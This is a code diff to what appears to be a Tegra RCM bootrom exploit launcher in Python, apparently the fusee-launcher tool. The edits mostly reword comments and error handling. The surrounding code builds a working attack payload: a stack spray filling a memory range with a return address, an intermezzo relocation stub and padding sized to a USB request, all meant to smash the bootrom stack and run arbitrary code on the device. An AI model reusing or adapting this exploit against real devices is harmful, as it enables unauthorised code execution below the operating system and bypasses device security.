@@ -26,13 +26,20 @@ import os
 import sys
 import usb
 import time
+import errno
 import ctypes
 import argparse
 import platform
 
-# specify the locations of important load components
+# The address where the RCM payload is placed.
+# This is fixed for most device.
 RCM_PAYLOAD_ADDR    = 0x40010000
+
+# The address where the user payload is expected to begin.
 PAYLOAD_START_ADDR  = 0x40010E40
+
+# Specify the range of addresses where we should inject oct
+# payload address.
 STACK_SPRAY_START   = 0x40014E40
 STACK_SPRAY_END     = 0x40017000
 
@@ -295,7 +302,7 @@ class RCMHax:
 
             # ... and we're allowed to wait for one, wait indefinitely for one to appear...
             if wait_for_device:
-                print("Waiting for a TegraRCM to come online...")
+                print("Waiting for a TegraRCM device to come online...")
                 while self.dev is None:
                     self.dev = self._find_device()
 
@@ -456,24 +463,25 @@ with open(intermezzo_path, "rb") as f:
     payload        += intermezzo
 
 
-# Pad the payload till the start of the payload
+# Pad the payload till the start of the user payload.
 padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
 payload += (b'\0' * padding_size)
 
 target_payload = b''
-# Read the rest of the payload into memory.
+
+# Read the user payload into memory.
 with open(payload_path, "rb") as f:
     target_payload = f.read()
 
-# First part of the payload
+# Fit a collection of the payload before the stack spray...
 padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
 payload += target_payload[:padding_size]
 
-# Gap in the payload, stack spray
+# ... insert the stack spray...
 repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
 
-# Read the rest of the payload into memory.
+# ... and follow the stack spray with the remainder of the payload.
 payload += target_payload[padding_size:]
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
@@ -482,9 +490,12 @@ payload_length = len(payload)
 padding_size   = 0x1000 - (payload_length % 0x1000)
 payload += (b'\0' * padding_size)
 
+# Check to see if our payload packet will fit inside the RCM high buffer.
+# If it won't, error out.
 if len(payload) > length:
-    print("ERROR: Too large payload! (%x vs %x)" % (len(payload), length))
-    sys.exit(-2)
+    size_over = len(payload) - length
+    print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
+    sys.exit(errno.EFBIG)
 
 # Send the constructed payload, which contains the command, the stack smashing
 # values, the Intermezzo relocation stub, and the final payload.
